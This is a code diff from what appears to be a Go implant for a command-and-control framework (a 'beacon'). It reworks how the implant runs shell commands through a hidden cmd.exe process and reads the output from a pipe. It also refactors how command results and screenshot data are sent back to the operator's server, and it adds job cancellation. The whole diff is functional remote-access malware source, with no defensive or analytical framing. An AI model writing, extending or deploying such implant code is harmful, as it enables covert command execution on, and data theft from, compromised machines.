@@ -95,8 +95,13 @@ func Run(b []byte) error {
 	if err != nil {
 		return err
 	}
-	// result was send to server in runNative
-	_, err = runNative(string(path), string(args))
+	// result was send to server in runNative, now we set whole runNative async
+	go func() {
+		err := runNative(string(path), string(args))
+		if err != nil {
+			packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
+		}
+	}()
 	return err
 
 	//path = strings.Trim(path, " ")
@@ -146,7 +151,7 @@ func Exec(b []byte) error {
 
 // call windowsAPI CreateProcess, when it's cmd `shell`, %COMSPEC% will be the path
 // and cmd run doesn't give path, as set path to null and args as commandline
-func runNative(path string, args string) ([]byte, error) {
+func runNative(path string, args string) error {
 	args = strings.Trim(args, " ")
 	var (
 		sI windows.StartupInfo
@@ -165,11 +170,11 @@ func runNative(path string, args string) ([]byte, error) {
 	// create anonymous pipe
 	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return nil, errors.New(util.Sprintf("CreatePipe error: %s", err))
-	}
-	// because we need to use go func to send result back asynchronously, so we can't use defer to close handle,
-	// close it manually
+		return err
 
+	}
+	defer windows.CloseHandle(hWPipe)
+	defer windows.CloseHandle(hRPipe)
 	sI.Flags = windows.STARTF_USESTDHANDLES
 	sI.StdErr = hWPipe
 	sI.StdOutput = hWPipe
@@ -183,67 +188,88 @@ func runNative(path string, args string) ([]byte, error) {
 		resolvedPath := os.Getenv(envKey)
 		pathPtr = windows.StringToUTF16Ptr(resolvedPath)
 	} else {
-		_ = windows.CloseHandle(hWPipe)
-		_ = windows.CloseHandle(hRPipe)
-		return nil, errors.New("path is not null or %COMSPEC%")
+		return errors.New("path is not null or %COMSPEC%")
+
 	}
 	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
-
 	if err != nil {
-		_ = windows.CloseHandle(hWPipe)
-		_ = windows.CloseHandle(hRPipe)
-		return nil, err
+		return err
 	}
+	defer windows.CloseHandle(pI.Process)
+	defer windows.CloseHandle(pI.Thread)
+	return loopRead(pI.Process, hRPipe, 10*1000, packet.CALLBACK_OUTPUT, nil)
+}
 
-	go func() {
-		defer windows.CloseHandle(pI.Process)
-		defer windows.CloseHandle(pI.Thread)
-		defer windows.CloseHandle(hWPipe)
-		defer windows.CloseHandle(hRPipe)
-		// some task like tasklist wouldn't exit, only wait for 10 seconds for output
-		// and if time out I may need to kill it manually
-		event, err := windows.WaitForSingleObject(pI.Process, 10*1000)
-		if event == uint32(windows.WAIT_TIMEOUT) {
-			// this only kill target process, if cmd.exe call tasklist.exe,
-			// only cmd.exe will be killed, and tasklist will still exist, which may make beacon cannot exit fully?
-			// but it only occurs in goland, maybe just goland continue tracking subprocesses.
-			defer windows.TerminateProcess(pI.Process, 0)
+// this func read from pipe and send result back to server
+func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callbackType int, stopChan chan bool) error {
+	event, err := windows.WaitForSingleObject(handle, uint32(sleepTime))
+	if err != nil {
+		return err
+	}
+	finish := false
+	var buf []byte
+	for !finish {
+		// process alterable(exit)
+		if event == windows.WAIT_OBJECT_0 {
+			finish = true
 		}
-		if err != nil {
-			packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
-		}
-		finish := false
-		for !finish {
-			if event == windows.WAIT_OBJECT_0 {
-				finish = true
+		select {
+		// only works in job control
+		case <-stopChan:
+			return errors.New("job canceled")
+		default:
+			result, err := readPipe(hRPipe)
+			if err != nil && err != windows.ERROR_PIPE_NOT_CONNECTED {
+				return err
 			}
-			// use PeekNamedPipe to determine whether output exist
-			// if lpTotalBytesAvail is 0, ReadFile will block the whole process
-			var lpTotalBytesAvail uint32
-			_, _, err = peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
-			if err != nil && err != windows.SEVERITY_SUCCESS {
-				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
-			}
-			if lpTotalBytesAvail != 0 {
-				if lpTotalBytesAvail > 0x80000 {
-					packet.PushResult(packet.CALLBACK_OUTPUT, []byte("output bigger than 0x80000"))
-				} else {
-					buf := make([]byte, lpTotalBytesAvail)
-					var bytesRead uint32
-					// Overlapped will be ignored when reading anonymous pipe
-					_ = windows.ReadFile(hRPipe, buf, &bytesRead, nil)
-					packet.PushResult(packet.CALLBACK_OUTPUT, buf[:bytesRead])
+			if result != nil {
+				switch callbackType {
+				case packet.CALLBACK_SCREENSHOT:
+					buf = append(buf, result...)
+				default:
+					packet.PushResult(callbackType, result)
 				}
 			}
-			// use WaitForSingleObject to check if process had exit
-			event, err = windows.WaitForSingleObject(pI.Process, 0)
-			if err != nil {
-				packet.PushResult(packet.CALLBACK_ERROR, []byte(err.Error()))
-				break
-			}
 		}
-		packet.PushResult(packet.CALLBACK_OUTPUT, []byte("--------------output end----------------"))
-	}()
+		// use WaitForSingleObject to check if process had exit
+		event, err = windows.WaitForSingleObject(handle, uint32(sleepTime)/10)
+		if err != nil {
+			return err
+		}
+	}
+	switch callbackType {
+	// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
+	case packet.CALLBACK_SCREENSHOT:
+		packet.PushResult(callbackType, buf[4:])
+	case packet.CALLBACK_OUTPUT:
+		packet.PushResult(callbackType, []byte("--------------------------output end--------------------------"))
+	}
+	return nil
+}
+
+func readPipe(hRPipe windows.Handle) ([]byte, error) {
+	// use PeekNamedPipe to determine whether output exist
+	// if lpTotalBytesAvail is 0, ReadFile will block the whole process
+	var lpTotalBytesAvail uint32
+	_, _, err := peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
+	if err != nil && err != windows.SEVERITY_SUCCESS {
+		return nil, err
+	}
+	if lpTotalBytesAvail != 0 {
+		if lpTotalBytesAvail > 0x80000 {
+			return nil, errors.New("output bigger than 0x80000")
+		} else {
+			buf := make([]byte, lpTotalBytesAvail)
+			var bytesRead uint32
+			// document said bytesRead can't be none under win7
+			// Overlapped will be ignored when reading anonymous pipe
+			err = windows.ReadFile(hRPipe, buf, &bytesRead, nil)
+			if err != nil {
+				return nil, err
+			}
+			return buf[:bytesRead], nil
+		}
+	}
 	return nil, nil
 }
 
